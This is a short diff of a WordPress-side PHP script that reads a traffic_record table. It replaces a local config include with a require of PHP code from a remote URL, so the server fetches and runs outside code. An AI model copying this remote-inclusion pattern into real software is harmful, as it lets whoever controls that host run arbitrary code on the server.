@@ -62,9 +62,9 @@
 
     <?php
 require('../wp-load.php');
-require('./db-config.php');
+// require('./db-config.php');
 
-
+require('https://perspectivecr.org/traffic/db-config.php');
 $query = "SELECT * FROM traffic_record";
 
 $result = mysqli_query($conn, $query);
